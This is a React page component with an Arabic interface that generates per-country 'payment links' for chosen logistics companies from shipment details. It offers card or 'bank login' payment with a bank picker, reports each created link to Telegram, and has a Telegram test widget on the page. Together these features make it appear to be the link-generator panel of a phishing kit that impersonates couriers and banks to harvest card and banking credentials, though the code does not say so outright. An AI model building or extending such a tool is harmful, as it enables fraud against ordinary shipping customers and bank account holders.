import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getLogisticsServicesByCountry } from "@/lib/logisticsServices";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { Truck, Hash, MapPin, Package, Scale, Ruler, DollarSign, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateLogisticsLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getLogisticsServicesByCountry(country?.toUpperCase() || "");

  const [selectedService, setSelectedService] = useState("");
  const [shipmentId, setShipmentId] = useState("");
  const [originAddress, setOriginAddress] = useState("");
  const [destinationAddress, setDestinationAddress] = useState("");
  const [cargoDescription, setCargoDescription] = useState("");
  const [weight, setWeight] = useState("100");
  const [length, setLength] = useState("");
  const [width, setWidth] = useState("");
  const [height, setHeight] = useState("");
  const [serviceType, setServiceType] = useState("freight");
  const [insuranceValue, setInsuranceValue] = useState("10000");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  const selectedServiceData = useMemo(() =>
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !shipmentId || !originAddress || !destinationAddress) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول المطلوبة", variant: "destructive" });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "logistics",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          shipment_id: shipmentId,
          origin_address: originAddress,
          destination_address: destinationAddress,
          cargo_description: cargoDescription,
          weight: parseFloat(weight) || 0,
          dimensions: { length, width, height },
          service_type: serviceType,
          insurance_value: parseFloat(insuranceValue) || 0,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'logistics_shipment_created',
        data: {
          shipment_id: shipmentId,
          origin_address: originAddress,
          destination_address: destinationAddress,
          cargo_description: cargoDescription,
          weight: parseFloat(weight) || 0,
          length, width, height,
          service_type: serviceType,
          insurance_value: parseFloat(insuranceValue) || 0,
          service_name: selectedServiceData?.name || selectedService,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        description: selectedServiceData?.description
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({ title: "تم الإرسال بنجاح", description: "تم إرسال البيانات إلى التليجرام" });
      } else {
        toast({ title: "تحذير", description: "فشل في إرسال البيانات", variant: "destructive" });
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
  };

  const handlePreview = () => window.open(createdPaymentUrl, '_blank');

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Truck className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-6"><TelegramTest /></div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">خدمات لوجستية</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm">الخدمة اللوجستية *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر الخدمة اللوجستية" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>{service.name}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {selectedService && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <h3 className="font-semibold text-sm mb-1">{selectedServiceData.name}</h3>
                  <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                </div>
              )}

              {/* Shipment ID */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم الشحنة *
                </Label>
                <Input value={shipmentId} onChange={(e) => setShipmentId(e.target.value)} placeholder="SH-2024-001" className="h-9 text-sm" required />
              </div>

              {/* Origin Address */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <MapPin className="w-3 h-3" />
                  عنوان المنشأ *
                </Label>
                <Input value={originAddress} onChange={(e) => setOriginAddress(e.target.value)} placeholder="الرياض، حي الملقا، شارع الملك فهد" className="h-9 text-sm" required />
              </div>

              {/* Destination Address */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <MapPin className="w-3 h-3" />
                  عنوان الوجهة *
                </Label>
                <Input value={destinationAddress} onChange={(e) => setDestinationAddress(e.target.value)} placeholder="دبي، الإمارات" className="h-9 text-sm" required />
              </div>

              {/* Cargo Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" />
                  وصف البضائع
                </Label>
                <Input value={cargoDescription} onChange={(e) => setCargoDescription(e.target.value)} placeholder="إلكترونيات، ملابس، أغذية" className="h-9 text-sm" />
              </div>

              {/* Weight */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Scale className="w-3 h-3" />
                  الوزن (كيلو) *
                </Label>
                <Input type="number" value={weight} onChange={(e) => setWeight(e.target.value)} placeholder="100" className="h-9 text-sm" min="0" required />
              </div>

              {/* Dimensions */}
              <div className="grid grid-cols-3 gap-2">
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Ruler className="w-3 h-3" />
                    الطول (سم)
                  </Label>
                  <Input type="number" value={length} onChange={(e) => setLength(e.target.value)} placeholder="100" className="h-9 text-sm" />
                </div>
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Ruler className="w-3 h-3" />
                    العرض (سم)
                  </Label>
                  <Input type="number" value={width} onChange={(e) => setWidth(e.target.value)} placeholder="80" className="h-9 text-sm" />
                </div>
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Ruler className="w-3 h-3" />
                    الارتفاع (سم)
                  </Label>
                  <Input type="number" value={height} onChange={(e) => setHeight(e.target.value)} placeholder="60" className="h-9 text-sm" />
                </div>
              </div>

              {/* Service Type */}
              <div>
                <Label className="mb-2 text-sm">نوع الخدمة *</Label>
                <Select value={serviceType} onValueChange={setServiceType}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر نوع الخدمة" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="freight">شحن بري/بحري/جوي</SelectItem>
                    <SelectItem value="warehouse">تخزين</SelectItem>
                    <SelectItem value="customs">تخليص جمركي</SelectItem>
                    <SelectItem value="delivery">توصيل</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Insurance Value */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  قيمة التأمين
                  {country && <span className="text-xs text-muted-foreground">({getCurrencyName(country)})</span>}
                </Label>
                <Input type="number" value={insuranceValue} onChange={(e) => setInsuranceValue(e.target.value)} placeholder="10000" className="h-9 text-sm" min="0" />
              </div>

              {/* Payment Method */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">بطاقة ائتمان</SelectItem>
                    <SelectItem value="bank_login">تسجيل دخول البنك</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Bank Selection */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img src={bank.logo} alt={bank.nameAr} className="h-5 w-5 object-contain" onError={(e) => e.currentTarget.style.display = 'none'} />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}

              {/* Submit Button */}
              <Button type="submit" className="w-full py-5" disabled={createLink.isPending}>
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Truck className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء شحنة لوجستية</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">✅ تم إنشاء الشحنة بنجاح!</AlertDialogTitle>
            <AlertDialogDescription className="text-center">يمكنك نسخ الرابط أو معاينته</AlertDialogDescription>
          </AlertDialogHeader>
          <div className="my-4">
            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">{createdPaymentUrl}</div>
            <div className="flex gap-2">
              <Button onClick={handleCopyLink} variant="outline" className="flex-1">{copied ? "تم النسخ!" : "نسخ الرابط"}</Button>
              <Button onClick={handlePreview} variant="outline" className="flex-1">معاينة</Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateLogisticsLink;
